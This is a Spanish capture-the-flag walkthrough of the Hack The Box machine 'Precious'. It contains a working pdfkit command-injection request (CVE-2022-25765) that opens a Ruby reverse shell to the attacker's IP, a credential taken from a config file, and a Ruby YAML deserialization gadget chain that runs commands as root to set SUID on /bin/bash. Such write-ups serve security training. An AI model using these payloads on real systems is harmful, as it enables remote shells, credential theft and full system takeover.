---
layout: single
title: Precious - Hack The Box
excerpt: "Esta fue una máquina algo difícil, porque no sabía bien como acceder como usuario, trate de cargar un Payload, pero no funciono, estudie el ataque Smuggling para tratar de obtener credenciales, pero no lo entendí del todo bien, intente usar un Exploit para Ruby-on-rails, pero no funciono, por eso tarde bastante en resolverla. En fin, vamos a abusar de la herramienta que genera el el PDF que usa la página web de la máquina, llamado pdfkit, usaremos el Exploit CVE-2022-25765 para acceder a la máquina y robar las credenciales del usuario. Una vez conectados como usuario, abusaremos de un script de Ruby que tiene permisos de SUDO para inyectar código malicioso que nos permita escalar privilegios como root, esto en base al YAML Deserialization."
date: 2023-04-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-precious/precious_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - pdfkit 0.8.6 
  - Command Injection - CI
  - CI - CVE-2022-25765
  - Ruby Enumeration
  - SUDO Exploitation
  - YAML Deserialization
  - OSCP Style
---
![](/assets/images/htb-writeup-precious/precious_logo.png)

Esta fue una máquina algo difícil, porque no sabía bien como acceder como usuario, trate de cargar un Payload, pero no funciono, estudie el **ataque Smuggling** para tratar de obtener credenciales, pero no lo entendí del todo bien, intente usar un Exploit para **Ruby-on-rails**, pero no funciono, por eso tarde bastante en resolverla. En fin, vamos a abusar de la herramienta que genera el el PDF que usa la página web de la máquina, llamado **pdfkit**, usaremos el Exploit **CVE-2022-25765** para acceder a la máquina y robar las credenciales del usuario. Una vez conectados como usuario, abusaremos de un script de **Ruby** que tiene permisos de **SUDO** para inyectar código malicioso que nos permita escalar privilegios como Root, esto en base al **YAML Deserialization**.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#pdfkit">Buscando un Exploit para pdfkit v0.8.6</a></li>
				<li><a href="#Ruby">Enumeración Ruby</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está conectada y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.11.189                        
PING 10.10.11.189 (10.10.11.189) 56(84) bytes of data.
64 bytes from 10.10.11.189: icmp_seq=1 ttl=63 time=129 ms
64 bytes from 10.10.11.189: icmp_seq=2 ttl=63 time=130 ms
64 bytes from 10.10.11.189: icmp_seq=3 ttl=63 time=130 ms
64 bytes from 10.10.11.189: icmp_seq=4 ttl=63 time=130 ms

--- 10.10.11.189 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3013ms
rtt min/avg/max/mdev = 129.359/129.769/129.969/0.241 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.189 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:49 CST
Initiating SYN Stealth Scan at 11:49
Scanning 10.10.11.189 [65535 ports]
Discovered open port 22/tcp on 10.10.11.189
Discovered open port 80/tcp on 10.10.11.189
Completed SYN Stealth Scan at 11:49, 27.06s elapsed (65535 total ports)
Nmap scan report for 10.10.11.189
Host is up, received user-set (0.89s latency).
Scanned at 2023-04-10 11:49:23 CST for 27s
Not shown: 53229 filtered tcp ports (no-response), 12304 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.30 seconds
           Raw packets sent: 126040 (5.546MB) | Rcvd: 12410 (496.440KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Veo solamente dos puertos abiertos, como no tenemos credenciales para el SSH, vamos directamente con el puerto HTTP.

<h2 id="Servicios">Escaneo de Servicios</h2>

```
nmap -sC -sV -p22,80 10.10.11.189 -oN targeted                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:51 CST
Nmap scan report for 10.10.11.189
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Bien, ahí viene un servicio, el **nginx 1.18.0**, lo investigaré después. Es momento de analizar la página web.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Puerto 80</h2>

Entremos.

Shale no se puede, ya sabemos qué hacer en estos casos.
```
nano /etc/hosts
10.10.11.189 precious.htb
```
Recargamos la página y ahora sí, ya podemos verla.

![](/assets/images/htb-writeup-precious/Captura1.png)

Vale, convierte una página en un PDF, veamos lo que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-precious/Captura2.png">
</p>

Ahí vemos el servicio **nginx 1.18.0** y vemos que la página está hecha en PHP, esto nos puede servir más adelante.

Hagamos **Fuzzing** para ver si hay algo de interés.

<h2 id="Fuzz">Fuzzing</h2>

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://precious.htb/FUZZ/      
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://precious.htb/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000001:   200        18 L     42 W       483 Ch      "# directory-list-2.3-medium.txt"                                    
000000007:   200        18 L     42 W       483 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"    
000000003:   200        18 L     42 W       483 Ch      "# Copyright 2007 James Fisher"                                      
000000010:   200        18 L     42 W       483 Ch      "#"                                                                  
000000011:   200        18 L     42 W       483 Ch      "# Priority ordered case sensative list, where entries were found"   
000000009:   200        18 L     42 W       483 Ch      "# Suite 300, San Francisco, California, 94105, USA."                
000000012:   200        18 L     42 W       483 Ch      "# on atleast 2 different hosts"                                     
000000013:   200        18 L     42 W       483 Ch      "#"                                                                  
000000014:   200        18 L     42 W       483 Ch      "http://precious.htb//"                                              
000000006:   200        18 L     42 W       483 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"      
000000008:   200        18 L     42 W       483 Ch      "# or send a letter to Creative Commons, 171 Second Street,"         
000000005:   200        18 L     42 W       483 Ch      "# This work is licensed under the Creative Commons"                 
000000002:   200        18 L     42 W       483 Ch      "#"                                                                  
000000004:   200        18 L     42 W       483 Ch      "#"                                                                  
000045240:   200        18 L     42 W       483 Ch      "http://precious.htb//"                                              
000155453:   503        0 L      29 W       189 Ch      "previousHeaderGraphics"                                             
000155446:   503        0 L      29 W       189 Ch      "newsforgeNewsforge"                                                 
000155438:   503        0 L      29 W       189 Ch      "ps-vir5"                                                            
000155429:   503        0 L      29 W       189 Ch      "ble"                                                                
000155475:   503        0 L      29 W       189 Ch      "40686"                                                              
000155473:   503        0 L      29 W       189 Ch      "data-license"                                                       
000155469:   503        0 L      29 W       189 Ch      "smallright16"
...
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Hay demasiados archivos que, por el código de estado, no podemos ver, agreguemos el PHP a ver que pasa:

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://precious.htb/FUZZ.php/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://precious.htb/FUZZ.php/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        18 L     42 W       483 Ch      "# directory-list-2.3-medium.txt"                                     
000000003:   200        18 L     42 W       483 Ch      "# Copyright 2007 James Fisher"                                       
000000007:   200        18 L     42 W       483 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000013:   200        18 L     42 W       483 Ch      "#"                                                                   
000000012:   200        18 L     42 W       483 Ch      "# on atleast 2 different hosts"                                      
000000011:   200        18 L     42 W       483 Ch      "# Priority ordered case sensative list, where entries were found"    
000000010:   200        18 L     42 W       483 Ch      "#"                                                                   
000000009:   200        18 L     42 W       483 Ch      "# Suite 300, San Francisco, California, 94105, USA."                 
000000006:   200        18 L     42 W       483 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000008:   200        18 L     42 W       483 Ch      "# or send a letter to Creative Commons, 171 Second Street,"          
000000005:   200        18 L     42 W       483 Ch      "# This work is licensed under the Creative Commons"                  
000000002:   200        18 L     42 W       483 Ch      "#"                                                                   
000000004:   200        18 L     42 W       483 Ch      "#"                                                                   

Total time: 565.2140
Processed Requests: 220560
Filtered Requests: 220547
Requests/sec.: 390.2238
```
Mmmmm no nos dio nada, entonces hagamos lo que nos pide.

Tratemos de darle una página cualquiera, puse "hola_mundo" de Wikipedia:

![](/assets/images/htb-writeup-precious/Captura3.png)

Mmmmm no sirvió, vamos a ver que pasa si lo hacemos con una página local, hagámoslo por pasos:

* Abramos un servidor web con Python:
```
python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Ponemos la IP y el puerto en la página web de la máquina:
```
http://Tu_IP:8000/
```
* Le damos click y nos saca el PDF:

![](/assets/images/htb-writeup-precious/Captura4.png)

* Descargamos el PDF y lo guardamos en nuestra carpeta de la máquina.

Bien, si bien podemos ver el contenido del PDF, es mejor utilizar la herramienta **pdfinfo**, solamente pon **pdfinfo** en la terminal y te preguntará si la quieres descargar, dile que si y ya la podrás usar:
```
pdfinfo n005vxio3bqkzrd9hf90yf60sl0jz8gu.pdf
No se ha encontrado la orden «pdfinfo», pero se puede instalar con:
apt install poppler-utils
¿Quiere instalarlo? (N/y)y
apt install poppler-utils
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias... Hecho
Leyendo la información de estado... Hecho
...
```
Ahora veamos que nos dice esta herramienta:
```
pdfinfo n005vxio3bqkzrd9hf90yf60sl0jz8gu.pdf 
Creator:         Generated by pdfkit v0.8.6
Custom Metadata: no
Metadata Stream: yes
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       612 x 792 pts (letter)
Page rot:        0
File size:       18455 bytes
Optimized:       no
PDF version:     1.4
```
Interesante, vemos que utilizaron una herramienta para crear el PDF, quizá exista un Exploit, vamos a buscarlo.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="pdfkit">Buscando un Exploit para pdfkit v0.8.6</h2>

Buscando un Exploit para esta herramienta, me encontré con un **GitHub** con la forma de vulnerarla y usando esta máquina como prueba para obtener acceso. Vamos a usar esta forma, así que vámonos por pasos:
* Abrimos un servidor web con Python:
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
* Abrimos una netcat:
```
nc -nvlp 443         
listening on [any] 443 ...
```
* Cargamos una petición y la modificamos poniendo la dirección de la página web de la máquina y poniendo nuestra IP y un puerto:
```
curl 'http://precious.htb/' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://precious.htb/' -H 'Connection: keep-alive' -H 'Referer: http://precious.htb/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22AQUI_PON_TU_IP%22%2CAQUI_PON_EL_PUERTO%29%29%27%60'  
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```
* Resultado:
```
nc -nvlp 443         
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.189] 34916
whoami
ruby
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```
Estamos dentro. Diría que busquemos la flag, pero no somos usuarios, vamos a buscar que cosillas encontramos aquí.

<h2 id="Ruby">Enumeración Ruby</h2>

Para no mostrar todo lo que vi, que es inútil, voy a poner lo interesante para que sea en corto.

Entramos en la carpeta **/home** para ver si podemos ver la flag, que te recuerdo, no vamos a poder verla:
```
cd /home
ls
henry
ruby
cd henry        
ls
user.txt
cat user.txt
cat: user.txt: Permission denied
```
Tenemos un usuario, pero no tenemos la contraseña, vamos a ver si hay directorios ocultos de **Ruby** porque del usuario no podremos verlos:
```
cd ruby
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Apr 10 14:08 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Apr 10 14:08 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```
Muy bien, si tratamos de ver todos, el que contendrá la contraseña y el usuario, será el directorio oculto **.bundle**:
```
cd .bundle
ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 4 ruby ruby 4096 Apr 10 14:08 ..
-r-xr-xr-x 1 root ruby   62 Sep 26  2022 config
```
Excelente, veamos que dice ese archivo **config**:
```
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
exit
```
Uffffff, muy bien.

Es momento de entrar a la máquina por el servicio SSH:
```
ssh henry@10.10.11.189              
The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.
ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.189' (ED25519) to the list of known hosts.
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ whoami
henry
henry@precious:~$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 .
drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root  root     9 Sep 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26  2022 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26  2022 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26  2022 .profile
-rw-r----- 1 root  henry   33 Apr 10 13:40 user.txt
henry@precious:~$ cat user.txt
```

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Veamos que podemos hacer como usuario:
```
henry@precious:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
Tenemos acceso a un archivo que tiene permiso como Root que esta hecho en **Ruby**. Vamos a analizarlo:
```
henry@precious:~$ cd /opt
henry@precious:/opt$ ls
sample  update_dependencies.rb
henry@precious:/opt$ cat update_dependencies.rb

# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

```
Por lo que entiendo, este script en **Ruby**, utiliza un archivo llamado **dependencies.yml** para poder instalar o actualizar la versión de **Ruby** creo.

Dicho archivo de **.yml** es creado con la librería **YAML**, entonces vamos a buscar un Exploit para **YAML**.

Encontré algo llamado **YAML Deserialization**:
* https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml

Pero la siguiente página lo explica mejor:
* https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

En resumen, vamos a utilizar la librería **YAML** para ejecutar código malicioso cuando se valide el script **dependencies.yml**. Para hacer esto, debemos crear un archivo del mismo nombre y poner lo siguiente:
```
  !ruby/object:Gem::Installer
     i: x
  !ruby/object:Gem::SpecFetcher
     i: y
  !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: sleep 600
          method_id: :resolve
```
Ahora el que hará la movida sabrosa para ejecutar código, será este **git_set:**.

Hagamos una prueba, vamos por pasos:
* Creamos el archivo **dependencies.yml**, OJO, esto solo podremos hacer en la carpeta **henry**:
```
henry@precious:/home$ pwd
/home/henry
henry@precious:~$ nano dependencies.yml
```
* Dentro del archivo ponemos el script de arriba y cambiamos el **git_set** por un **whoami** para ver si nos suelta algo:

```
  !ruby/object:Gem::Installer
     i: x
  !ruby/object:Gem::SpecFetcher
     i: y
  !ruby/object:Gem::Requirement
   requirements:
     !ruby/object:Gem::Package::TarReader
     io: &1 !ruby/object:Net::BufferedIO
       io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
       debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: whoami
          method_id: :resolve
```

* Ejecutamos el script con permisos de SUDO y veamos que pasa:
```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
...
```
Vaya, vaya, vemos que ahí dice root. Hagamos otra prueba namas porque si, ahora en vez de usar **whoami** pongamos **id**:
```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
```
Excelente, escalemos privilegios pues, solo demos permisos de ejecución a usuarios de la Bash para ser Root, hagámoslo por pasos:

* Antes veamos que permisos tiene la Bash:
```
henry@precious:~$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
* Ahora agreguemos el cambio al script para cambiar los permisos:
```
       socket: !ruby/module 'Kernel'
                  method_id: :system
              git_set: chmod +s /bin/bash
          method_id: :resolve
```
* Lo corremos el script de SUDO:
```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
...
```
* Comprobamos si se hizo el cambio:
```
ls -la /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

¡Si se hizo!, entremos a la Bash y busquemos la flag:
```
henry@precious:~$ bash -p
bash-5.1# whoami
root
bash-5.1# ls
dependencies.yml  user.txt
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
```

Y listo, ya tenemos las flags.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://github.com/shamo0/PDFkit-CMD-Injection
* https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
* https://github.com/UNICORDev/exploit-CVE-2022-25765
* https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Insecure%20Deserialization/YAML/#pyyaml
* https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/
* https://portswigger.net/web-security/request-smuggling
* https://snyk.io/test/docker/nginx%3A1.18.0
* https://vuldb.com/?id.155282
* https://cwe.mitre.org/data/definitions/444.html


<br>
# FIN

